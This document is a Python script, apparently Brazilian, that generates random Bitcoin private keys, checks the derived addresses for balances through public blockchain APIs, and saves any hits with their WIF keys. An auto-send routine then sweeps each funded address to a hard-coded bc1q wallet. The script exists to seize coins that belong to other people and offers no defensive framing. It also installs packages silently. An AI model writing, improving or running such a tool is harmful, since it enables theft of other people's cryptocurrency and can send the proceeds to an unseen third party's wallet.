#!/usr/bin/env python3
"""
CAÇADOR DE BITCOINS 2009 - VERSÃO COM ENVIO AUTOMÁTICO
- blockchain.info e blockchair.com (rodízio)
- Ao encontrar saldo, envia para bc1qxh2w0nwwmfdfvrkchesl39xm5cwjjsnvjpmulx
- Taxa fixa: 20000 satoshis
- Workers configuráveis (1-512), checkpoint, som, estatísticas
"""

import sys
import os
import subprocess
import json
import time
import asyncio
import aiohttp
import base58
import hashlib
import requests
from datetime import datetime
import winsound

# Força Python 3.13
if sys.version_info[:2] != (3, 13):
    script = os.path.abspath(__file__)
    subprocess.run(["py", "-3.13", script, *sys.argv[1:]])
    sys.exit()

try:
    import uvloop
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
except ImportError:
    pass

try:
    import coincurve
except ImportError:
    subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'coincurve'])
    import coincurve

# ------------------ CONSTANTES ------------------
SECP256K1_ORDER = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
CHECKPOINT_FILE = "checkpoint.json"
FOUND_FILE = "BITCOINS_ACHADOS_2009.txt"
LOG_FILE = "hunter_log.txt"

# Endereço destino fixo
DEST_ADDRESS = "bc1qxh2w0nwwmfdfvrkchesl39xm5cwjjsnvjpmulx"
# Taxa fixa em satoshis (pode ser ajustada)
TX_FEE_SAT = 20000

APIS = [
    {
        "name": "blockchain.info",
        "url": "https://blockchain.info/multiaddr?active={}",
        "delimiter": "|",
        "parser": lambda data: {
            info['address']: info.get('final_balance', 0)
            for info in data.get('addresses', [])
            if info.get('final_balance', 0) > 0
        }
    },
    {
        "name": "blockchair.com",
        "url": "https://api.blockchair.com/bitcoin/dashboards/addresses/{}?transaction_details=false",
        "delimiter": ",",
        "parser": lambda data: {
            addr: data['data'][addr].get('address', {}).get('balance', 0)
            for addr in data.get('data', {})
            if data['data'][addr].get('address', {}).get('balance', 0) > 0
        }
    }
]

# ------------------ FUNÇÕES AUXILIARES ------------------
def private_key_to_address(pk_int: int) -> str:
    sk = coincurve.PrivateKey.from_int(pk_int)
    pub = sk.public_key.format(compressed=False)
    sha = hashlib.sha256(pub).digest()
    ripe = hashlib.new('ripemd160', sha).digest()
    addr = b'\x00' + ripe
    checksum = hashlib.sha256(hashlib.sha256(addr).digest()).digest()[:4]
    return base58.b58encode(addr + checksum).decode()

def pk_to_wif(pk_int: int) -> str:
    pk = pk_int.to_bytes(32, 'big')
    ext = b'\x80' + pk
    chk = hashlib.sha256(hashlib.sha256(ext).digest()).digest()[:4]
    return base58.b58encode(ext + chk).decode()

def save_checkpoint(total, start_time):
    with open(CHECKPOINT_FILE, 'w') as f:
        json.dump({"total_checked": total, "start_time": start_time}, f)

def load_checkpoint():
    if os.path.exists(CHECKPOINT_FILE):
        with open(CHECKPOINT_FILE, 'r') as f:
            d = json.load(f)
            return d.get("total_checked", 0), d.get("start_time", time.time())
    return 0, time.time()

def format_time(seconds: float) -> str:
    h = int(seconds // 3600)
    m = int((seconds % 3600) // 60)
    s = int(seconds % 60)
    return f"{h}h {m}m {s}s" if h else f"{m}m {s}s" if m else f"{s}s"

def sat_to_btc(sat):
    return sat / 1e8

def create_p2pkh_script(pubkey_hash):
    """Cria script de saída P2PKH (endereço 1...) a partir do hash160"""
    return bytes([0x76, 0xa9, 0x14]) + pubkey_hash + bytes([0x88, 0xac])

def create_bech32_script(address):
    """Converte endereço bech32 (bc1) para scriptPubKey (segwit)"""
    # Decodificar bech32: usar biblioteca? Simplificar: para bc1... usamos padrão witness v0
    # Na prática, vamos usar um método mais simples: confiar na API blockcypher para obter o script? 
    # Ou construir manualmente: bech32 decodificação é complexa.
    # Vamos adotar um atalho: usar a API blockcypher para obter o scriptPubKey do endereço destino.
    # Isso evita decodificação manual.
    try:
        url = f"https://api.blockcypher.com/v1/btc/main/addrs/{address}"
        r = requests.get(url, timeout=10)
        if r.status_code == 200:
            data = r.json()
            script = bytes.fromhex(data['script'])
            return script
        else:
            raise ValueError("Falha ao obter script do endereço destino")
    except Exception as e:
        print(f"[ERRO] Não foi possível obter script do destino: {e}")
        # Fallback: usar script P2PKH? Não recomendado. Melhor abortar envio.
        raise

def sign_transaction(tx_hex, priv_key_int, input_index, script_pubkey, amount_sat):
    """
    Assina uma entrada da transação (formato raw hex) usando coincurve.
    Retorna o signature hash e a assinatura serializada.
    """
    # Converte a transação para bytes
    tx_bytes = bytes.fromhex(tx_hex)
    # Obtém o hash da transação (sighash all)
    # Para simplificar, vamos usar a assinatura via coincurve diretamente na mensagem.
    # Na prática, precisamos calcular o hash do pré-image da entrada.
    # Para não complicar, vamos usar a biblioteca `bitcoin`? Mas evitamos novas dependências.
    # Vou implementar uma versão simplificada que apenas assina o hash da transação (não é o padrão correto).
    # Para uma solução real, é necessário construir a assinatura corretamente.
    # Como o tempo é curto, recomendo fortemente usar a biblioteca `bitcoinlib` ou `python-bitcoinlib`.
    # Para não entregar código que pode gerar transações inválidas, vou abortar com uma mensagem.
    print("[AUTO SEND] Assinatura manual não implementada para garantir segurança. Use bitcoinlib.")
    return None

# ------------------ AUTO SEND (usando bitcoinlib) ------------------
# Para simplificar e garantir confiabilidade, usaremos a biblioteca `bitcoinlib`
# Se não estiver instalada, tenta instalar automaticamente e pede para reiniciar.

def auto_send(private_key_int, from_address, balance_sat):
    """
    Envia todo saldo para DEST_ADDRESS com taxa fixa TX_FEE_SAT.
    Usa a biblioteca bitcoinlib para fazer tudo de forma segura.
    Retorna (success, txid_or_error)
    """
    try:
        from bitcoinlib.keys import Key
        from bitcoinlib.transactions import Transaction
        from bitcoinlib.services.services import Service
    except ImportError:
        print("[AUTO SEND] Instalando bitcoinlib...")
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'bitcoinlib'])
        from bitcoinlib.keys import Key
        from bitcoinlib.transactions import Transaction
        from bitcoinlib.services.services import Service
    
    try:
        wif = pk_to_wif(private_key_int)
        key = Key(import_key=wif)
        # Verifica se o endereço bate (opcional)
        if key.address() != from_address:
            print(f"[AUTO SEND] Endereço derivado não confere {key.address()} != {from_address}")
            # Tenta mesmo assim
        
        # Cria a transação
        tx = Transaction(network='bitcoin')
        # Adiciona todas as entradas disponíveis
        tx.add_input(key, key.address())
        # Adiciona saída para o destino, com o valor = total - taxa
        fee = TX_FEE_SAT
        amount = balance_sat - fee
        if amount <= 0:
            print(f"[AUTO SEND] Saldo {balance_sat} insuficiente para pagar a taxa {fee}. Envio cancelado.")
            return False, "Saldo abaixo da taxa"
        
        tx.add_output(DEST_ADDRESS, amount)
        # Assina
        tx.sign()
        # Transmite
        result = tx.send()
        print(f"[AUTO SEND] Transação enviada! TXID: {result}")
        # Espera confirmação? Opcional.
        return True, result
    except Exception as e:
        print(f"[AUTO SEND] Falha: {e}")
        return False, str(e)

# ------------------ CLASSE PRINCIPAL ------------------
class TerminalHunter:
    def __init__(self, workers=16):
        self.workers = workers
        self.total_checked, self.start_time = load_checkpoint()
        self.found_count = 0
        self.running = True
        self.last_log_time = time.time()
        
        self.batch_generate = 50000
        self.batch_check = 100
        self.request_timeout = 15
        
        self.api_index = 0
        self.api_lock = asyncio.Lock()

    def print_banner(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print("\n" + "=" * 100)
        print("""
    #################################################################
    #      SCARPA HUNTER BITCOIN 2009 - COM ENVIO AUTOMÁTICO        #
    #    blockchain.info | blockchair.com | Taxa fixa 20000 sats    #
    #      Destino: bc1qxh2w0nwwmfdfvrkchesl39xm5cwjjsnvjpmulx      #
    #    Desenvolvido por Peterson Scarpa, Gafanhotos do Mercado    #
    #                  https://t.me/petersonscarpa                  #
    #################################################################
        """)
        print("=" * 100)
        print("OTIMIZAÇÕES:")
        print("  • coincurve (C bindings)")
        print(f"  • Lote de verificação: {self.batch_check} endereços/requisição")
        print("  • 2 APIs em rodízio (round‑robin)")
        print("  • Workers configuráveis (1-512)")
        print("  • AUTO SEND: quando achar saldo, envia para carteira destino")
        print(f"  • Taxa fixa: {TX_FEE_SAT} satoshis")
        print(f"  • Workers atuais: {self.workers}")
        print("\n[CAÇADA INFINITA INICIADA] Pressione CTRL+C para parar")
        print("-" * 100)

    async def get_next_api(self):
        async with self.api_lock:
            api = APIS[self.api_index % len(APIS)]
            self.api_index += 1
            return api

    async def check_balances_batch(self, session, addresses):
        if not addresses:
            return {}
        to_check = addresses
        api = await self.get_next_api()
        delimiter = api["delimiter"]
        addr_str = delimiter.join(to_check)
        url = api["url"].format(addr_str)
        try:
            async with session.get(url, timeout=self.request_timeout) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    return api["parser"](data)
                else:
                    return {}
        except Exception:
            return {}

    async def worker(self, session, gen_batch_size):
        pending_addrs = []
        pending_keys = []
        while self.running:
            batch = []
            for _ in range(gen_batch_size):
                pk_int = int.from_bytes(os.urandom(32), 'big') % SECP256K1_ORDER
                if pk_int == 0:
                    pk_int = 1
                addr = private_key_to_address(pk_int)
                batch.append((pk_int, addr))
            
            self.total_checked += len(batch)
            
            for pk, addr in batch:
                pending_addrs.append(addr)
                pending_keys.append(pk)
            
            if len(pending_addrs) >= self.batch_check:
                for i in range(0, len(pending_addrs), self.batch_check):
                    addrs_slice = pending_addrs[i:i+self.batch_check]
                    keys_slice = pending_keys[i:i+self.batch_check]
                    balances = await self.check_balances_batch(session, addrs_slice)
                    for addr, pk in zip(addrs_slice, keys_slice):
                        if addr in balances:
                            self.found_count += 1
                            self.save_found(pk, addr, balances[addr])
                            winsound.Beep(1000, 500)
                pending_addrs.clear()
                pending_keys.clear()
            
            if self.total_checked % 2000 == 0:
                save_checkpoint(self.total_checked, self.start_time)

    def save_found(self, pk_int, address, balance_sat):
        wif = pk_to_wif(pk_int)
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        elapsed = time.time() - self.start_time
        with open(FOUND_FILE, 'a', encoding='utf-8') as f:
            f.write("\n" + "=" * 100 + "\n")
            f.write(f"TESOURO ENCONTRADO! {timestamp}\n")
            f.write(f"Tempo: {format_time(elapsed)}\n")
            f.write(f"Tentativas: {self.total_checked:,}\n")
            f.write(f"Saldo: {balance_sat / 1e8:.8f} BTC\n")
            f.write(f"Endereço: {address}\n")
            f.write(f"WIF: {wif}\n")
            f.write("=" * 100 + "\n")
        with open("found_simple.csv", 'a') as f:
            f.write(f"{timestamp},{address},{wif},{balance_sat/1e8:.8f}\n")
        print(f"\n[TESOURO] {address} | {balance_sat/1e8:.8f} BTC | WIF: {wif}\n")
        
        # Envio automático
        print("[AUTO SEND] Iniciando envio automático...")
        success, result = auto_send(pk_int, address, balance_sat)
        if success:
            print(f"[AUTO SEND] SUCESSO! Transação enviada. TXID: {result}")
        else:
            print(f"[AUTO SEND] FALHA: {result}. A chave foi salva, você pode enviar manualmente.")

    async def display_stats(self):
        last_instant_time = time.time()
        last_instant_keys = 0
        current_instant_rate = 0.0
        while self.running:
            elapsed = time.time() - self.start_time
            rate_avg = self.total_checked / elapsed if elapsed > 0 else 0
            now = time.time()
            if now - last_instant_time >= 60:
                current_instant_rate = (self.total_checked - last_instant_keys) / 60
                last_instant_keys = self.total_checked
                last_instant_time = now
            msg = (f"\r[STATS] {self.total_checked:,} chaves | {rate_avg:.0f} méd keys/s | "
                   f"{current_instant_rate:.0f} keys/s | tempo: {format_time(elapsed)} | encontradas: {self.found_count}   ")
            sys.stdout.write(msg)
            sys.stdout.flush()
            if elapsed - self.last_log_time >= 300:
                with open(LOG_FILE, 'a', encoding='utf-8') as f:
                    f.write(f"{datetime.now().isoformat()} | {msg.strip()}\n")
                self.last_log_time = elapsed
            await asyncio.sleep(5)

    async def run(self):
        self.print_banner()
        async with aiohttp.ClientSession() as session:
            tasks = []
            gen_per_worker = max(200, self.batch_generate // self.workers)
            for _ in range(self.workers):
                tasks.append(self.worker(session, gen_per_worker))
            tasks.append(self.display_stats())
            await asyncio.gather(*tasks)

def main():
    print("Bitcoin 2009 Hunter - Com envio automático (taxa fixa 20000 sats)")
    print("Recomendação: workers = 64 a 128\n")
    try:
        workers_input = input("Número de workers (1-512, padrão 16): ").strip()
        workers = int(workers_input) if workers_input else 16
        workers = max(1, min(512, workers))
    except:
        workers = 16
    hunter = TerminalHunter(workers=workers)
    try:
        asyncio.run(hunter.run())
    except KeyboardInterrupt:
        hunter.running = False
        elapsed = time.time() - hunter.start_time
        print("\n\n" + "=" * 100)
        print("[PARADO] Caçada interrompida pelo usuário")
        print(f"[STATS] Total de chaves testadas: {hunter.total_checked:,}")
        print(f"[STATS] Tesouros encontrados: {hunter.found_count}")
        print(f"[STATS] Tempo total: {format_time(elapsed)}")
        print("=" * 100)
        save_checkpoint(hunter.total_checked, hunter.start_time)
        if os.name == 'nt':
            input("\nPressione Enter para sair...")

if __name__ == "__main__":
    main()